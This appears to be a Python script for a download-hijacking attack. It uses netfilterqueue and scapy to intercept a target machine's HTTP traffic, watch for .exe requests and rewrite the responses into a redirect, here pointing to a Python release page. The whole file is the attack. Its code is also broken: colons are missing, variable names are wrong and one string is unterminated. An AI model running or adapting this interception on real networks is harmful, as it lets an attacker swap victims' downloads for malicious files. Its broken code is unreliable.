#!/usr/bin/python

import netfilterqueue
import scapy.all as scapy

'''
Analyze target machines HTTP traffic, request or response. When target machine has initiates a download,
program will  access the load (Raw Layer Load) )and hijack the connection. Redirecting the download to python 
3.5.10 release.
'''


ack_list = []

'''
Parameteres: Scapy Packet and Load
Instead of modyifying the IP and TCP len and chksum fields function will remove them from the packet. When the program 
sets the payload of the packet scapy will handle the recalculation of these fields.
'''
def set_load(packet, load)
	packet[scapy.Raw].load = load
				 
	del scapy_packet[scapy.IP].len
	del scapy_packet[scapy.IP].chksum
	del scapy_packet[scapy.TCP].len
				
	return packet
'''
Parameters: Packet
Manually filter packets for an HTTP layer. Program will execute funcionality to hijack the connection between target machine
and its intended handshake partner to replace download method/file.
'''
def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	
	# IP, TCP, UDP, RAW layers. HTTP data is packaged in the raw layer. 
	# Manually filter packets that contain an HTTP layer.
	if scapy_packet.haslayer(scapy.raw)
		#print(scapy_packet.show())
		# Differentiate packets as Request or Response.
		# dport of 80 is a HTTP request
		if scapy_packet[scapy.TCP].dport == 80:
			print("[+] HTTP Request")
			if ".exe" in scapy_packet[scapy.Raw].load:
				print("[+] exe Request")
				ack_list.append(scapy_packet[scapy.TCP].ack)
		# sport of 80 is a HTTP response
		elif scapy_packet[scapy.TCP].sport == 80:		
			print("[+] HTTP Response")
			if scapy.packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy.packet[scapy.TCP].seq)
				print("[+] Replacing file)
				modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.python.org/downloads/release/python-3510\n\n")
				packet.set_payload(str(modified_packet))
		
	packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

